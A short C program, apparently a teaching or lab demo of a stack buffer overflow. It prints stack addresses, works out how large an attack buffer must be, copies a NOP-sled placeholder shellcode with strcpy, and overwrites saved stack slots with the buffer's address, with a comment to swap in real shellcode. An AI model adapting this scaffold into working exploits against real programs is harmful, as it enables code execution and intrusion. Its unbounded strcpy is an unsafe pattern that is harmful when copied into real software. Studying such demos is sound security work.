#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int *hold;
int i,j;
char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90";
//Replace the above NOP shell code with your shell code.

unsigned long get_sp(void) { 
  __asm__("movl %esp,%eax"); 
} 

void dumb(char *arg)
{
  int *test;
  hold=(int *)&test;
  char filename[1024];   //Buffer to hold filename.
  printf("\nValue of Test:%x",(char *)&test);
  printf("\nValue of filename[0]:%x\n",(char *)filename);
  printf("The attack buffer is going to need to be a little bit bigger than:%d",((int)test-(int)filename));
 
  strcpy (filename, shellcode);
  
  for (i=0;i<5;i++)
   {
     *hold=filename;
     hold=hold+1;
   }
  
  return;
}

int main(int argc, char* argv[])
{
  char holding[10000];
  char *string;
  string=argv[1];
  unsigned long stack; 
  stack=get_sp();
  
    if(argc>1)                //Make sure that a filename was provided.
    {
      printf("\\Length of Input String:%d\\", strlen(string));
      dumb(argv[1]);   
    }
    else
      {
	printf("\n\nError: No Command Line arg for vuln was given\n\n");
	dumb("Useless Text");
      }
  return (0);
}
